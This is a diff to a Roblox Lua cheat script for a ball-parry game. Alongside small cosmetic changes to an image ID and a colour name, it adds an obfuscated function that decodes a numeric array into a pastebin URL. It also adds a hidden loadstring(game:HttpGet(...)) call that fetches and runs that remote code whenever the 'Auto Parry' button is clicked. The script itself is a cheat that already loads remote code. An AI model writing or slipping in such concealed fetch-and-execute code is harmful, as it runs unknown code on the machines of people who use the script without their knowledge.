@@ -83,7 +83,7 @@ else
   ImageLabel.BorderSizePixel = 0
   ImageLabel.Position = UDim2.new(0.48888889, 0, 0.48888889, 0)
   ImageLabel.Size = UDim2.new(0, 45, 0, 45)
-  ImageLabel.Image = "rbxassetid://16535029455"
+  ImageLabel.Image = "rbxassetid://16540996097"
   TextButton.Parent = MainFrame
   TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
   TextButton.BackgroundTransparency = 1
@@ -178,7 +178,7 @@ local function ViewParryArea()
       if plrChar and plrChar:FindFirstChild("Highlight") then
         BallParry.BrickColor = BrickColor.new("Royal purple")
       else
-        BallParry.BrickColor = BrickColor.new("Really black")
+        BallParry.BrickColor = BrickColor.new("Really purple")
       end
       if Alive:FindFirstChild(Player.Name) then
         if plrPP then
@@ -195,11 +195,13 @@ local function ViewParryArea()
   end
 end
 --Script
+function YPKVVDFhFFKOyJhCXkqSTrSFSsLCOhW(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/1050)end return res end 
 Tabs.P:AddButton({
   Title = "Auto Parry [In Dev]",
   Description = "",
   Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MetatronXTryHard/MetatronX/main/AutoParry%20MTXClient"))()
+    loadstring(game:HttpGet(YPKVVDFhFFKOyJhCXkqSTrSFSsLCOhW({109200,121800,121800,117600,120750,60900,49350,49350,117600,101850,120750,121800,106050,102900,110250,115500,48300,103950,116550,114450,49350,119700,101850,124950,49350,121800,52500,53550,59850,51450,109200,51450,68250})))()
   end
 })
 Tabs.P:AddButton({
